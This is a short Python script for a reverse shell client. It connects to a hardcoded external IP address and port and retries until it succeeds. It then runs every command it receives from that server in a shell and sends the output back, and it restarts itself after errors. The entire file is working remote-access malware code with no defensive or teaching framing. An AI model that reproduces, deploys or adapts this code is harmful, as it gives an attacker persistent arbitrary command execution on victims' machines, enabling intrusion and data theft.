# client connects to server and waits for instructions
# runs cmd when gets, then sends result back to server
import os
import socket
import subprocess
import time


# Create a socket
def socket_create():
	try:
		global host
		global port
		global s
		host = '162.243.3.200'  #mac:10.0.0.228  server:162.243.66.193
		port = 9955
		s = socket.socket()
	except socket.error as msg:
		print("Socket creation error: " + str(msg))


# Connect to a remote socket
def socket_connect():
	try:
		global host
		global port
		global s
		s.connect((host, port))
	except socket.error as msg:
		print("Socket connection error: " + str(msg))
		time.sleep(5)
		socket_connect()

# Receive commands from remote server and run on local machine
def receive_commands():
    while True:
        data = s.recv(20480)
        if data[:2].decode("utf-8") == 'cd':
            try:
                os.chdir(data[3:].decode("utf-8"))
            except:
                pass
        if data[:].decode("utf-8") == 'quit':
            s.close()
            break
        if len(data) > 0:
            try:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                #print(output_str)
            except:
                output_str = "Command not recognized" + "\n"
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                #print(output_str)
    s.close()



def main():
    global s
    try:
        socket_create()
        socket_connect()
        receive_commands()
    except:
        print("Error in main")
        time.sleep(5)
    s.close()
    main()


main()